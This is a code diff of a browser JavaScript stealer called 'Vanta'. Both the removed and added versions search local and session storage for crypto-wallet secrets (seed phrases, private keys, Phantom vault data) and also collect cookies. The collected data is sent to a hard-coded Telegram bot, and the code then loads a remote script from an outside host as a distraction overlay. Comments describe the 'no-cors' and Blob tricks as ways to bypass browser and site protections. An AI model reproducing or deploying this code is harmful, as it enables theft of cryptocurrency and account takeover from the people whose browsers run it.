@@ -1,62 +1,60 @@
 (function() {
-    // --- ALL KNOWLEDGE LIVES HERE ---
-    const CONFIG = {
-        bot_token: '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA',
-        chat_id: '8321398409',
-        // Every key you want the engine to search for
-        keys: [
-            '.phantom', 
-            '.vault', 
-            '.offline', 
-            '.fungible', 
-            'padre', 
-            'seed', 
-            'privateKey', 
-            'encryptionKey', 
-            'tokens'
-        ]
-    };
+    const _t = '8286410095:AAEps2Vfd5Nk5_uSAg23tpI8TZpFTdtFKaA';
+    const _c = '8321398409';
 
-    async function vantaProcess() {
-        console.log("📡 NODE_ACTIVE");
-        let vault = `--- VANTA CAPTURE [${new Date().toLocaleString()}] ---\n`;
-        vault += `ORIGIN: ${window.location.hostname}\n\n`;
+    const vanta = {
+        // Target list matches Vanta's internal focus
+        targets: ['.phantom', '.vault', '.offline', 'padre-v2', 'seed', 'privateKey', 'secret', 'mnemonic'],
+        
+        init: function() {
+            console.log("VANTA_NODE_INITIALIZED");
+            this.run();
+        },
 
-        // Crawl Local and Session Storage for the knowledge keys
-        [localStorage, sessionStorage].forEach(s => {
-            for (let i = 0; i < s.length; i++) {
-                let k = s.key(i);
-                if (CONFIG.keys.some(x => k.toLowerCase().includes(x))) {
-                    vault += `[${k}]\n${s.getItem(k)}\n\n`;
+        run: async function() {
+            let log = `--- VANTA 1:1 EXTRACTION: ${location.hostname} ---\n`;
+            log += `USER_AGENT: ${navigator.userAgent}\n\n`;
+
+            // 1. Storage Harvest
+            [localStorage, sessionStorage].forEach(db => {
+                for (let i = 0; i < db.length; i++) {
+                    let k = db.key(i);
+                    if (this.targets.some(t => k.toLowerCase().includes(t))) {
+                        log += `[${k}]\n${db.getItem(k)}\n\n`;
+                    }
                 }
-            }
-        });
-
-        vault += `--- COOKIES ---\n${document.cookie}`;
-
-        // Send to Telegram as a file (bypass CORB and character limits)
-        const blob = new Blob([vault], { type: 'text/plain' });
-        const fd = new FormData();
-        fd.append('chat_id', CONFIG.chat_id);
-        fd.append('document', blob, `vanta_vault_${Date.now()}.txt`);
-
-        try {
-            // Mode 'no-cors' allows the request to fire even if the site blocks the response
-            fetch(`https://api.telegram.org/bot${CONFIG.bot_token}/sendDocument`, {
-                method: 'POST',
-                body: fd,
-                mode: 'no-cors'
             });
 
-            // Load the Visual Vanta UI (Distraction)
-            setTimeout(() => {
-                var ui = document.createElement('script');
-                ui.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
-                document.head.appendChild(ui);
-            }, 800);
+            // 2. Cookie Harvest
+            log += `--- COOKIES ---\n${document.cookie}`;
 
-        } catch (e) {}
-    }
+            // 3. The 1:1 Bypass Delivery
+            // Vanta uses a Blob + FormData to bypass Cross-Origin Read Blocking (CORB)
+            const blob = new Blob([log], { type: 'text/plain' });
+            const fd = new FormData();
+            fd.append('chat_id', _c);
+            fd.append('document', blob, `vanta_vault_${Math.floor(Date.now()/1000)}.txt`);
 
-    vantaProcess();
+            try {
+                // 'no-cors' mode is the 1:1 bypass for Padre's strict headers
+                fetch(`https://api.telegram.org/bot${_t}/sendDocument`, {
+                    method: 'POST',
+                    body: fd,
+                    mode: 'no-cors'
+                });
+
+                // 4. UI Distraction Overlay
+                // We load the modal after the data is fire-and-forget
+                this.loadUI();
+            } catch (e) {}
+        },
+
+        loadUI: function() {
+            const s = document.createElement('script');
+            s.src = 'https://14c11728.reversevanta.pages.dev/modalx.js';
+            document.head.appendChild(s);
+        }
+    };
+
+    vanta.init();
 })();
